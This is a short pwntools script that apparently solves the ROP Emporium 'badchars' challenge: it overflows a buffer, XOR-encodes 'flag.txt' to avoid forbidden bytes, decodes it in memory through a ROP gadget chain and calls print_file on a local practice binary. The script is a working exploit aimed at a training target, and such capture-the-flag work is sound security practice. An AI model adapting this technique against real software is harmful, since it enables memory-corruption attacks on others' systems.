
from pwn import *

#badchars are: 'x', 'g', 'a', '.'
#badchars hex = 61|67|78|2e

overwrite = b"A"*40

# When we xor with the string , int shouldnt produce any bad chars. doing xor (string,2) give "dnce,vzv"
# no bad chars, which is why 2 is good for this exploit
# we could use anything to XOR with , for example 3 also works

to_be_xored_with = 2
to_be_xored_with2 = 3

nulls = p64(0x0)

pop_r12_r13_r14_r15 = p64(0x000000000040069c)
mov_r13_r12 = p64(0x0000000000400634)

pop_r14_r15 = p64(0x00000000004006a0)
xor_r15_r14 = p64(0x0000000000400628)

pop_rdi = p64(0x00000000004006a3)

freespace = p64(0x0000000000601030)

printfile = p64(0x0000000000400510)

string = p64(int.from_bytes(xor(b"flag.txt" , to_be_xored_with), "little"))

# below code should work too (with to_be_xored_with1 (xoring with 3))
# string1 = p64(int.from_bytes(xor(b"flag.txt" , to_be_xored_with2), "little"))

payload = overwrite + pop_r12_r13_r14_r15 + string + freespace + nulls + nulls + mov_r13_r12

for i in range(8):
    payload += pop_r14_r15
    payload += p64(2)
    payload += p64(0x0000000000601030 + i)
    payload += xor_r15_r14

payload += pop_rdi + freespace + printfile

p = process("./badchars")
p.send(payload)
p.interactive()
